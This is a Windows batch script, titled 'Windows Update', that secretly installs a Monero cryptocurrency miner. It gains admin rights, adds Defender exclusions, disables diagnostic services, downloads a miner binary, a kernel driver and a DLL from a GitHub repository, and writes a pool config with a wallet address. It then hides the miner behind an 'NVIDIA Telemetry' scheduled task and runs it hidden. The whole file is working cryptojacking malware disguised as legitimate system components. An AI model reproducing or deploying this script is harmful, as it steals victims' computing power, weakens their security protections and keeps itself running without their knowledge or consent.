@echo off
title Windows Update
set "MINER_DIR=%APPDATA%\WinSv"
set "LOG=%MINER_DIR%\install.log"
set "REPO=https://github.com/d3lph1nator/delpin4ik/raw/main"

set "TASK_NAME=NVIDIA Telemetry"

if not exist "%MINER_DIR%" mkdir "%MINER_DIR%" 2>nul

call :log "[%date% %time%] === Start ==="

:: Elevate to admin if not admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    call :log "[%date% %time%] Elevating to admin..."
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\"\"' -Verb RunAs"
    exit /b
)

call :log "[%date% %time%] Admin OK"

:: Kill only legacy processes (do not kill running nvsvc64)
taskkill /f /im DLL_Injector.exe >nul 2>&1
taskkill /f /im nvidia_d64.exe >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Remove-MpPreference -ExclusionPath 'C:\ProgramData\xmr' -ErrorAction SilentlyContinue; Remove-MpPreference -ExclusionPath 'C:\ProgramData\NvidiaDriver' -ErrorAction SilentlyContinue"
schtasks /delete /tn "NVIDIA Display" /f >nul 2>&1
schtasks /delete /tn "NVIDIA Reporter" /f >nul 2>&1
rd /s /q "C:\ProgramData\xmr" 2>nul
rd /s /q "C:\ProgramData\NvidiaDriver" 2>nul
call :log "[%date% %time%] Old leftovers cleaned"

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'nvsvc64.exe' -ErrorAction SilentlyContinue"
call :log "[%date% %time%] Exclusion added"

sc config DiagTrack start= disabled >nul 2>&1
sc stop DiagTrack >nul 2>&1
sc config DPS start= disabled >nul 2>&1
sc stop DPS >nul 2>&1
call :log "[%date% %time%] Telemetry services disabled"

if not exist "%MINER_DIR%\nvsvc64.exe" (
    call :log "[%date% %time%] Downloading Nvidia Driver..."
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%REPO%/nvsvc64.exe' -OutFile '%MINER_DIR%\nvsvc64.exe' -UseBasicParsing -ErrorAction Stop"
    if not exist "%MINER_DIR%\nvsvc64.exe" (
        call :log "[%date% %time%] ERROR: Download failed"
        exit /b 1
    )
    call :log "[%date% %time%] driver installed"
) else (
    call :log "[%date% %time%] nvsvc64.exe already present"
)

if not exist "%MINER_DIR%\WinRing0x64.sys" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%REPO%/WinRing0x64.sys' -OutFile '%MINER_DIR%\WinRing0x64.sys' -UseBasicParsing -ErrorAction Stop"
    call :log "[%date% %time%] WinRing0x64.sys downloaded"
) else (
    call :log "[%date% %time%] WinRing0x64.sys already present"
)

if not exist "%MINER_DIR%\nvsettings.json" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$j='{\"autosave\":true,\"background\":true,\"cpu\":{\"enabled\":true,\"huge-pages\":true,\"1gb-pages\":false,\"max-threads-hint\":80,\"memory-pool\":false},\"opencl\":false,\"cuda\":false,\"pools\":[{\"url\":\"pool.hashvault.pro:443\",\"user\":\"4AsZeyD9fDwAqiWBcDSdU61xwmvpxrL3iZRAdcRuSdn87WHgqzeaPSVAR1Dx2tn61adF4b3rMuAtJSsTYAavgt1LDhAv348\",\"pass\":\"x\",\"rig-id\":\"'+$env:COMPUTERNAME+'\",\"tls\":true,\"keepalive\":true}],\"donate-level\":0,\"print-time\":30,\"pause-on-battery\":true,\"pause-on-active\":30,\"yield\":false}'; $j | ConvertFrom-Json | ConvertTo-Json -Depth 10 | Set-Content '%MINER_DIR%\nvsettings.json'"
    call :log "[%date% %time%] nvsettings.json created (80)"
) else (
    call :log "[%date% %time%] nvsettings.json already present"
)

:: Recreate scheduled task for current path (migrates off old ProgramData)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$a=New-ScheduledTaskAction -Execute '%MINER_DIR%\nvsvc64.exe' -Argument '-c %MINER_DIR%\nvsettings.json' -WorkingDirectory '%MINER_DIR%'; $t=New-ScheduledTaskTrigger -AtLogOn; $s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit 0; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger $t -Settings $s -RunLevel Highest -Force | Out-Null"
call :log "[%date% %time%] Sch created"

if not exist "%MINER_DIR%\nvdrv.dll" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%REPO%/nvdrv.dll' -OutFile '%MINER_DIR%\nvdrv.dll' -UseBasicParsing"
    call :log "[%date% %time%] dll downloaded"
) else (
    call :log "[%date% %time%] nvdrv.dll already present"
)

:: Start only if not already running
tasklist /fi "imagename eq nvsvc64.exe" 2>nul | find /i "nvsvc64.exe" >nul
if errorlevel 1 (
    call :log "[%date% %time%] Starting Nvidia Driver..."
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\nvsvc64.exe' -ArgumentList '-c %MINER_DIR%\nvsettings.json' -WorkingDirectory '%MINER_DIR%' -WindowStyle Hidden"
) else (
    call :log "[%date% %time%] nvsvc64.exe already running"
)

call :log "[%date% %time%] === Done ==="
goto :eof

:log
echo %~1 >> "%LOG%"
goto :eof
